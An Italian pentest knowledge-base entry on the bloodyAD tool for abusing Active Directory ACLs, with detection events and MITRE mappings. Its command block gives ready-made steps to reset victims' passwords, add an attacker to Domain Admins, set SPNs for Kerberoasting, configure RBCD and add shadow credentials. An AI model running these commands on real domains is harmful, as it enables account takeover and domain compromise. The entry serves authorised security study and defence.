---
tipo: entita
tag: [tool, ad]
fase: 3
fonti: 2
aggiornato: 2026-06-21
stato: maturo
aliases: ["bloodyAD"]
---

# bloodyAD

> **Nota etica**: solo lab autorizzati o engagement con permesso scritto.

## In breve
**bloodyAD** è un tool Python per **leggere e modificare oggetti di [[Active Directory]] via LDAP/LDAPS** in modo mirato — pensato per **abusare le ACL** trovate con [[BloodHound]]. Dove BloodHound *mostra* il percorso di attacco (es. "hai `GenericWrite` su questo utente"), bloodyAD lo **esegue**: cambia password, aggiunge membri a gruppi, imposta SPN, configura RBCD, ecc. Supporta autenticazione con password, NT hash ([[Pass-the-Hash]]) o ticket Kerberos.

## Operazioni tipiche (abuso ACL)
```bash
BASE="--host 10.10.10.1 -d dominio.local -u attacker -p Password!"

# Cosa posso scrivere? (mappa i diritti sfruttabili)
bloodyAD $BASE get writable

# GenericWrite/ForceChangePassword su un utente → cambiagli la password
bloodyAD $BASE set password victimuser 'NewPass123!'

# GenericAll/WriteMember su un gruppo → aggiungiti
bloodyAD $BASE add groupMember 'Domain Admins' attacker

# Targeted Kerberoasting: scrivi un SPN su un utente che controlli
bloodyAD $BASE set object victimuser servicePrincipalName -v 'fake/svc'

# RBCD: delega l'host target al tuo computer account
bloodyAD $BASE add rbcd TARGET$ ATTACKERPC$

# AS-REP roasting setup / DontReqPreauth, shadow credentials (msDS-KeyCredentialLink)
bloodyAD $BASE add uac victimuser -f DONT_REQ_PREAUTH
bloodyAD $BASE add shadowCredentials victimuser
```
Dopo `set password`/`shadowCredentials` → autentichi come la vittima e prosegui la catena ([[Kerberos]], [[DCSync]]).

## Perché usarlo
- **Chirurgico**: una primitiva ACL per comando, ideale per sfruttare esattamente l'edge che BloodHound segnala.
- **Cross-platform** (da Kali/Linux), niente RSAT.
- Supporta **LDAPS** e autenticazione moderna (`-k` Kerberos, `-H` hash).

## Detection
- **Event 5136** (modifica oggetto directory) su attributi sensibili: `member`, `servicePrincipalName`, `msDS-AllowedToActOnBehalfOfOtherIdentity`, `msDS-KeyCredentialLink`.
- Reset password anomali (**4724**), modifiche gruppi privilegiati (**4728/4732**).
- MITRE: **T1098** (Account Manipulation), **T1222** (modifica permessi).

## Collegamenti
- [[BloodHound]] — trova gli edge che bloodyAD sfrutta
- [[Active Directory]] · [[Kerberos]] · [[DCSync]] · [[Pass-the-Hash]]
- [[Impacket]] — alternative (`dacledit`, `addcomputer`, `rbcd`)

## Fonti
- bloodyAD — GitHub: https://github.com/CravateRouge/bloodyAD
- The Hacker Recipes — AD movement (ACL abuse): https://www.thehacker.recipes/ad/movement/dacl/
